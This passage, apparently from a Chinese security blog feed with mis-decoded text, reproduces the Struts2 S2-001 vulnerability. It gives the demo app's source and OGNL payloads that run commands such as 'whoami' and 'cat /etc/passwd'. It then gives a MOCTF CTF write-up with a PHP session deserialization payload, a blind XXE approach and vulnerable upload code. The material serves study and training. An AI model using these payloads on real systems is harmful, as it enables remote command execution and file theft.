class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>S2-001 Demo<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>link: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;</span>https://cwiki.apache.org/confluence/display/WW/S2-001<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"login"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">label</span>=<span class="string">"username"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">label</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">s:submit</span>&gt;</span><span class="tag">&lt;/<span class="name">s:submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>welcome.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="meta-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>struts.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>com.demo.action.LoginAction.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.username = username;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.password = password;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">				&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;xishir&amp;password&#x3D;%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/s2/s2-001-2.png" alt=""></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>è·å–tomcatæ‰§è¡Œè·¯å¾„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>è·å–Webè·¯å¾„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><br>å¸¦å‚æ•°çš„å‘½ä»¤ï¼š<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code><br><img src="/img/s2/s2-001-3.png" alt=""></p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br><a href="http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/struts2/s2-001</a><br><a href="https://chybeta.github.io/2018/02/06/ã€struts2-å‘½ä»¤-ä»£ç æ‰§è¡Œæ¼æ´åˆ†æç³»åˆ—ã€‘S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/ã€struts2-å‘½ä»¤-ä»£ç æ‰§è¡Œæ¼æ´åˆ†æç³»åˆ—ã€‘S2-001/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ç»å†äº†å‡ æ¬¡é¢è¯•ï¼Œæ·±è§‰åœ¨ä¼ä¸šä¸­ï¼Œjavaå®‰å…¨æ˜¯ååˆ†å—é‡è§†çš„ï¼Œäºæ˜¯æ‰“ç®—å¯¹javaå®‰å…¨è¿›è¡Œæ·±å…¥å­¦ä¹ ï¼Œæœ¬ç³»åˆ—æ˜¯å¯¹Struts2çš„æ¼æ´è¿›è¡Œåˆ†æä¸å¤ç°ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¤§å®¶æŒ‡å‡ºé—®é¢˜ï¼Œæœ¬æ–‡æ‰€æœ‰æºç ä¸poc&amp;amp;expï¼š&lt;a href=&quot;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="Struts2" scheme="https://www.codemonster.cn/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>2018 MOCTF æ–°æ˜¥æ¬¢ä¹èµ› éƒ¨åˆ†WriteUp+æ„Ÿæƒ³</title>
    <link href="https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/</id>
    <published>2018-02-13T14:11:58.000Z</published>
    <updated>2018-07-28T06:19:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä»æ”¾å‡åˆ°ç°åœ¨ç­¹åŠå‡†å¤‡äº†æ¥è¿‘ä¸¤ä¸ªæ˜ŸæœŸçš„MOCTFæ–°æ˜¥æ¬¢ä¹èµ›ç»ˆäºè½å¹•å•¦ï¼Œè¿™æ¬¡æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†1ç­¾åˆ°+1MISC+3WEBï¼Œä¸‹é¢å…ˆæ”¾å®˜æ–¹WriteUpï¼ˆå“‡ç»ˆäºèƒ½å½“ä¸€å›å®˜æ–¹äº†ï¼‰<br><a id="more"></a></p>
<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><h3 id="ç­¾åˆ°-20"><a href="#ç­¾åˆ°-20" class="headerlink" title="ç­¾åˆ° 20"></a>ç­¾åˆ° 20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ”¯ä»˜å®ä»Šå¹´é›†é½äº”ç¦èƒ½ä¸€èµ·å¹³åˆ†å¤šå°‘é’±ï¼Ÿ</span><br><span class="line">flagæ ¼å¼ï¼šmoctf&#123;æ•°å­—&#125;</span><br></pre></td></tr></table></figure>
<p>flag:moctf{500000000}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ç©ºword-100"><a href="#ç©ºword-100" class="headerlink" title="ç©ºword 100"></a>ç©ºword 100</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœŸçš„ä»€ä¹ˆéƒ½æ²¡æœ‰å—</span><br></pre></td></tr></table></figure>
<p>æ–‡ä»¶æ˜¯ä¸ªword<br>æ‰“å¼€çœ‹å‘ç°ä¸€äº›å¥‡æ€ªçš„æ¢è¡Œå’Œtab<br><img src="/img/2018moctf1.png" alt=""><br>å¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯æ‘©æ–¯å¯†ç ï¼Œæ›¿æ¢åå¾—åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -..</span><br></pre></td></tr></table></figure><br>è§£æ‘©æ–¯å¯†ç ï¼Œç„¶åhexè½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="ç™»å½•ä¸€å“ˆ-300"><a href="#ç™»å½•ä¸€å“ˆ-300" class="headerlink" title="ç™»å½•ä¸€å“ˆ 300"></a>ç™»å½•ä¸€å“ˆ 300</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç™»å½•ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ã€‚</span><br><span class="line">http:&#x2F;&#x2F;111.230.32.124:6001&#x2F;</span><br></pre></td></tr></table></figure>
<p>æºç æ”¾åˆ°gité‡Œæ³„éœ²ç»™å¤§å®¶äº†<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        $_SESSION[<span class="string">"username"</span>] = $username;</span><br><span class="line">        header(<span class="string">"Location:./index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;hello '</span>.$_SESSION[<span class="string">"username"</span>].<span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure><br>flag.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="string">"moctf&#123;xxxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag == <span class="keyword">$this</span>-&gt;name)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wow,this is flag:"</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>çœ‹æºç å°±å¯ä»¥çŸ¥é“è¿™é“é¢˜è€ƒæŸ¥çš„æ˜¯sessionååºåˆ—æ¼æ´äº†<br>åœ¨index.phpä¸­phpçš„åºåˆ—åŒ–handleræ˜¯â€™php_binaryâ€™ï¼Œè€Œflag.phpé‡Œæ²¡æœ‰è®¾ç½®ï¼Œå°±æ˜¯é»˜è®¤çš„â€™phpâ€™<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br></pre></td></tr></table></figure><br>å‚è€ƒ<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br>index.phpä¸­çš„<code>$_session[&#39;username&#39;]</code>å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½æ„é€ payloadåˆ°sessionï¼Œ<br>ç„¶åè®¿é—®flag.phpé¡µé¢å°±èƒ½è§¦å‘ååºåˆ—åŒ–æ‰§è¡Œ<code>__destruct</code>äº†ï¼Œ<br>è¿™é‡Œè¿˜æœ‰ä¸ªè€ƒç‚¹æ˜¯<code>$this-&gt;flag == $this-&gt;name</code>ï¼Œé€šè¿‡å¼•ç”¨çš„æ–¹å¼ç»•è¿‡ã€‚<br>æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> MOCTF();</span><br><span class="line">$a-&gt;name = &amp;$a-&gt;flag;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'|'</span>.serialize($a);</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><br>æäº¤åˆ°index.phpçš„usernameï¼Œç„¶åè®¿é—®flag.phpå°±å¾—åˆ°flagäº†</p>
<h3 id="å­—ç¬¦ä¸²æ£€æŸ¥-400"><a href="#å­—ç¬¦ä¸²æ£€æŸ¥-400" class="headerlink" title="å­—ç¬¦ä¸²æ£€æŸ¥ 400"></a>å­—ç¬¦ä¸²æ£€æŸ¥ 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ¥æ£€æŸ¥ä¸€ä¸‹ä½ çš„å­—ç¬¦ä¸²æ˜¯å¦æ ¼å¼è‰¯å¥½å§ï¼</span><br><span class="line">http:&#x2F;&#x2F;111.230.32.124:6002&#x2F;</span><br></pre></td></tr></table></figure>
<p>åŸæ„æ˜¯xxeæ¼æ´è¯»å–ä»»æ„æ–‡ä»¶<br>åæ¥çŸ¥é“å¸ˆå‚…ä»¬å¡äº†å¾ˆä¹…è²Œä¼¼æ˜¯å› ä¸º<code>client-ip</code>çš„åŸå› ï¼Œæˆ‘çš„é”…<br>é¢˜ç›®æ‰“å¼€æ˜¯ä¸ªjsonå­—ç¬¦ä¸²éªŒè¯çš„é¡µé¢ï¼ŒPOSTåŒ…çš„<code>Content-Type</code>å­—æ®µæ˜¯<code>application/json</code>ï¼Œ<br>POSTåæ¥å£ä¼šè¿”å›jsonæ ¼å¼æ­£ç¡®æˆ–é”™è¯¯çš„ç»“æœ<br>æ”¹æˆ<code>application/xml</code>ï¼Œæ¥å£æç¤ºåªå…è®¸æœ¬æœºè®¿é—®ï¼Œäºæ˜¯æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip:localhost</span><br></pre></td></tr></table></figure><br>ç„¶åå°±æ˜¯xxeç›²æ‰“æ¼æ´äº†ï¼Œå‚è€ƒ<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br>è¿™é‡Œæˆ‘åªé™åˆ¶äº†payloadé•¿åº¦ä¸º170ä»¥å†…ï¼Œå…¶å®å®Œå…¨å¯ä»¥æ›´çŸ­çš„ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¯ä»¥æµ‹è¯•æµ‹è¯•<br>æœ€åflagåœ¨/etc/passwd</p>
<h3 id="ç®€å•å®¡è®¡-400"><a href="#ç®€å•å®¡è®¡-400" class="headerlink" title="ç®€å•å®¡è®¡ 400"></a>ç®€å•å®¡è®¡ 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç éƒ½ç»™ä½ äº†ï¼Œè¿˜è¯´ä¸ä¼šåšï¼Ÿ</span><br><span class="line">http:&#x2F;&#x2F;120.78.57.208:6005&#x2F;</span><br></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand_code</span><span class="params">($l = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>($l--) &#123;</span><br><span class="line">        $result .= chr(rand(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_rand_code</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $ip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    $code=get_rand_code();</span><br><span class="line">    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">    @socket_connect($socket, $ip, <span class="number">8888</span>);</span><br><span class="line">    @socket_write($socket, $code.PHP_EOL);</span><br><span class="line">    @socket_close($socket);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'test ok!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filename, $content,$savepath)</span> </span>&#123;</span><br><span class="line">    $AllowedExt = <span class="keyword">array</span>(<span class="string">'bmp'</span>,<span class="string">'gif'</span>,<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(strtolower($filename[count($filename)<span class="number">-1</span>]),$AllowedExt))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error ext!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $code=get_rand_code();</span><br><span class="line">    $finalname=$filename[<span class="number">0</span>].<span class="string">'moctf'</span>.$code.<span class="string">"."</span>.end($filename);</span><br><span class="line">    file_put_contents(<span class="string">"$savepath"</span>.$finalname, $content);</span><br><span class="line">    usleep(<span class="number">3000000</span>);</span><br><span class="line">    unlink(<span class="string">"$savepath"</span>.$finalname);</span><br><span class="line">    <span class="keyword">die</span>(<span 